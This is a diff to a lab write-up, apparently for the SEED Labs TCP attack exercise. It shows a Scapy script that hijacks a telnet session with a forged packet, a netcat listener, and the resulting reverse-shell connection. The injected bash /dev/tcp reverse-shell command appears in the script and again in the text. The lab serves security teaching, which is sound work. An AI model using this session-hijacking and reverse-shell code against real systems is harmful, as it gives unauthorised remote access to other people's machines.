@@ -317,16 +317,29 @@ from scapy.all import *
 
 ip = IP(src="10.9.0.6", dst="10.9.0.5")
 
-tcp = TCP(sport=50144, dport=23, flags="PA", seq=1283769608, ack=3194969444)
-# Command to open a reverse shell on port 9090 of host 10.9.1.0
+tcp = TCP(sport=58610, dport=23, flags="PA", seq=4220417700, ack=820664831)
+
 data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"
 pkt = ip/tcp/data
 ls(pkt)
 send(pkt,verbose=0)
 ```
 
-We open a TCP connection on our machine through the use of netcat: `netcat -lnv 9090`.
+We open a TCP connection on our machine through the use of netcat:
+```bash
+seed@VM:~/.../volumes$ docker exec -it seed-attacker /bin/bash
+root@VM:/# netcat -lnv 9090 
+Listening on 0.0.0.0 9090
+```
 
 We then send the forged packet and see if the shell connects to our machine, remembering to add carriage return (`\r`) and newline (`\n`) to be sure that the command is executed on the server: `data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r\n"`
 
 We did everything correctly and the reverse shell connected succesfully.
+
+```bash
+seed@VM:~/.../volumes$ docker exec -it seed-attacker /bin/bash
+root@VM:/# netcat -lnv 9090
+Listening on 0.0.0.0 9090
+Connection received on 10.9.0.5 47418
+seed@abb6db62e897:~$
+```
